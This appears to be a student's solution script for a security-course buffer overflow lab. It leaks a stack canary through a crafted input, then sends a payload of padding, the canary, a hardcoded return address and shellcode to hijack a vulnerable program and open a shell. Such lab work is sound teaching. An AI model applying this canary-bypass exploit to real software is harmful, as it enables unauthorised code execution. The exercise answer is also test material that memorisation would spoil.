#!/usr/bin/env python2

from scaffold import *

### YOUR CODE STARTS HERE ###

# Example send:
p.send('test\\x41\n')

# Example receive:
assert p.recvline() == 'testA'

# HINT: the last line of your exploit should look something like:
#   p.send('A' * m + canary + 'B' * n + rip + SHELLCODE + '\n')
# where m, canary, n and rip are all values you must determine
# and you might need to add a '\x00' somewhere

p.send('XYZXYZXYZXYZ\\x' + '\n')
pancake = p.recv(18)
canary = pancake[13:17]
print(" ".join("{:02x}".format(ord(c)) for c in canary))
rip = '\xd4\xf6\xff\xbf'
m = 15
n = 8

p.send('A'*m + '\x00' + canary + 'B'*n + rip + SHELLCODE + '\n')

### YOUR CODE  ENDS  HERE ###
returncode = p.end()

if returncode == -11: print 'segmentation fault or stack canary!'
elif returncode != 0: print 'return code', returncode
